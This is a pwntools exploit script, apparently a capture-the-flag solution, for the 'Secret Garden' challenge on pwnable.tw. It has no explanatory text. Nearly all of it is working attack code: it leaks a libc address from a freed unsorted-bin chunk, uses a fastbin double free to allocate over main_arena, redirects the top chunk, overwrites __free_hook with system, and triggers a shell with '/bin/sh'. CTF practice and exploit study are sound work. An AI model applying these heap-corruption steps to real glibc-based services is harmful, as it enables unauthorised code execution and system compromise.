from pwn import *

locdbg=False

host='chall.pwnable.tw'
port=10203
filename='./secretgarden.real'
libcname='./libc_64.so.6'
elf=ELF(filename)
slpt=0.2

if locdbg:
    p=process(filename)
    libc=ELF('./libc_64.so.6')
    #context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    context.log_level='debug'

def pwndbg(ctt):
    if locdbg:
        gdb.attach(p,gdbscript=ctt)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def crt(sz,ctt,clr):
    p.recvuntil(b'choice : ')
    p.sendline(b'1')
    slp()

    p.recvuntil(b'name :')
    p.sendline(str(sz).encode())
    slp()

    p.recvuntil(b'of flower :')
    p.send(ctt)
    slp()

    p.recvuntil(b'the flower :')
    p.send(clr)
    slp()

def vst():
    p.recvuntil(b'choice : ')
    p.sendline(b'2')
    slp()

def fr(idx):
    p.recvuntil(b'choice : ')
    p.sendline(b'3')
    slp()
    
    p.recvuntil(b'garden:')
    p.sendline(str(idx).encode())
    slp()

def cln():
    p.recvuntil(b'choice : ')
    p.sendline(b'4')
    slp()

clr1=b'rrrrrrrrggggggggbbbbbbb'

main_arena=0x3c3b20
crt(0x500,b'test0',clr1)
crt(0x28,b'test1',clr1)
fr(0)
fr(1)
crt(0x500,b'\x78',clr1)

vst()
p.recvuntil(b':')
lk_ma_88=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))
libc_base=lk_ma_88-88-main_arena
lk_ma=lk_ma_88-88
print('libc base ='+hex(libc_base))
print('top chunk='+hex(lk_ma_88))
print('main arena='+hex(lk_ma))
ml_hk=libc.symbols['__malloc_hook']+libc_base
fr_hk=libc.symbols['__free_hook']+libc_base
system_addr=libc.symbols['system']+libc_base
fk_ck=lk_ma-0x1b

crt(0x68,b'test3',clr1)
crt(0x68,b'test4',clr1)

fr(3)
fr(4)
fr(3)

crt(0x68,p64(fk_ck),clr1)
crt(0x68,b'/bin/sh\0',clr1)
crt(0x68,b'/bin/sh\0',clr1)
crt(0x68,b'\0'*(0xb+0x10)+p64(0)+p64(0x70)+p64(0)+p64(0)+p64(lk_ma+0x10),clr1)
#pwndbg('')
crt(0x68,b'\0'*(88-32)+p64(fr_hk-0xb58),clr1)
print('frhk='+hex(fr_hk))
crt(0x308,b'\0'*0x308,clr1)
crt(0x308,b'\0'*0x308,clr1)
crt(0x308,b'\0'*0x308,clr1)
crt(0x308,b'\0'*0x158+p64(system_addr),clr1)
#pwndbg('')
fr(6)
fin()